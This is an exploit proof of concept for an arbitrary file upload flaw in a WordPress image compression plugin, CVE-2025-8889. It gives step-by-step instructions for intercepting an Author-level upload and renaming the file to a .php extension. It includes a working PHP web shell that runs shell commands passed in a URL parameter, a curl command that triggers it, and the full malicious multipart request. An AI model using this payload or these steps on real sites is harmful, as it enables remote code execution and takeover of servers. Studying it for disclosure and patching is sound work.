# Exploit Title: WordPress Compress Then Upload Plugin 1.0.3 Arbitrary File Upload to RCE
**Date:** 2025-07-23  
**Exploit Author:** Muhammed Çelik  
**Vendor Homepage:** [https://wordpress.com/plugins/compress-then-upload](https://wordpress.com/plugins/compress-then-upload)  
**Software Link:** [https://downloads.wordpress.org/plugin/compress-then-upload.latest-stable.zip](https://downloads.wordpress.org/plugin/compress-then-upload.latest-stable.zip)  
**Version:** 1.0.3  
**Tested on:** Debian, WordPress 6.8.1, Apache 2.4.62, PHP 8.2.28  
**CVE:** CVE-2025-8889  

## Vulnerability
The "Compress Then Upload Images" WordPress plugin fails to properly validate file extensions and MIME types during image uploads via its media upload interface. Although client-side validations exist, these can be bypassed by intercepting and modifying the upload request.

An authenticated user with media upload permissions (Author role or higher) can exploit this by:

1. Uploading a benign image file first  
2. Intercepting the upload request (e.g., via Burp Suite)  
3. Modifying the uploaded filename extension and the file content to contain malicious PHP code  
4. Retaining the original MIME type header (image/jpeg) to bypass weak server-side checks  
5. Resulting in arbitrary PHP code execution (Remote Code Execution, RCE) on the server  

## PoC

**Step 1: Prepare a regular image file**  
Create a regular image file, e.g., `regular.jpg` (any valid JPG file).

**Step 2: Upload the regular image via WordPress Admin Panel**  
- Login to WordPress Admin Panel with a user having at least Author privileges.  
- Navigate to Media > Compress Then Upload Images (plugin’s upload interface).  
- Upload `regular.jpg` normally.

**Step 3: Intercept and modify the upload request with Burp Suite**  
- While the upload is in progress, intercept the HTTP multipart request in Burp Suite.  
- Modify the request:  
  - Change `filename="regular.jpg"` → `filename="evil.php"`  
  - Replace the file content with PHP web shell code:  

```php
GIF89a;
<?php
    if (isset($_GET['cmd'])) {
        system($_GET['cmd']);
    }


Note: The GIF89a; mimics a valid GIF header to bypass weak image validations.
Keep the Content-Type as image/jpeg.

Forward the modified request to the server.

Step 4: Trigger the uploaded web shell

If upload is successful, the PHP file will be saved in the uploads directory, e.g.:
http://target-site.com/wp-content/uploads/2025/07/evil.php

Access via browser or curl:

curl "http://target-site.com/wp-content/uploads/2025/07/evil.php?cmd=id"

Example Malicious Upload Request (Burp Suite)

POST /index.php?rest_route=/wpctu-api/v1/upload HTTP/1.1
Host: localhost:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json, text/plain, */*
...
Content-Disposition: form-data; name="file"; filename="evil.php"
Content-Type: image/jpeg

GIF89a;
<?php
    if (isset($_GET['cmd'])) {
        system($_GET['cmd']);
    }
?>
?>

